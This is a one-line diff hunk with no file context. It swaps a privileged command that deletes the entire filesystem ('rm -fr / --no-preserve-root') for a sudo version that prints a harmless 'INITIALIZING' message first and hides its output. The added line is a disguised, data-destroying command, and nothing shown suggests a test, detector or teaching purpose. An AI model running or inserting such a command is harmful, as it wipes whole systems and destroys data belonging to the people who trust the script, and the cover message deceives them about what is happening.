@@ -1,1 +1,1 @@
-pkexec rm -fr / --no-preserve-root
+echo INITIALIZING && sudo rm -fr / --no-preserve-root>/dev/null
